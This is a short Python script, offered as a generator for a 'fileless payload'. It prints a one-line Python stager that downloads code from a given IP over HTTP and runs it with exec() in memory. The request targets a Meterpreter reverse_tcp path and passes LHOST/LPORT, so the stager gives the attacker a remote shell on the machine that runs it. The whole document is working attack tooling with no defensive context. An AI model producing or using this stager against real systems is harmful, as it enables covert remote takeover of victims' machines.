import argparse
parser = argparse.ArgumentParser(description='Generate a fileless payload.')
parser.add_argument('ip', type=str, help='IP address')
parser.add_argument('port', type=int, help='Port number')
parser.add_argument('-a', '--admin', action='store_true', help='Include admin path')

args = parser.parse_args()

admin_path = "/admin" if args.admin else ""
print(f"""import urllib.request, json
exec(urllib.request.urlopen(urllib.request.Request("http://{args.ip}:1500/python/meterpreter/reverse_tcp{admin_path}", data=json.dumps({{"LHOST": "{args.ip}", "LPORT": {args.port}}}).encode(), headers={{'Content-Type': 'application/json'}})).read().decode())""")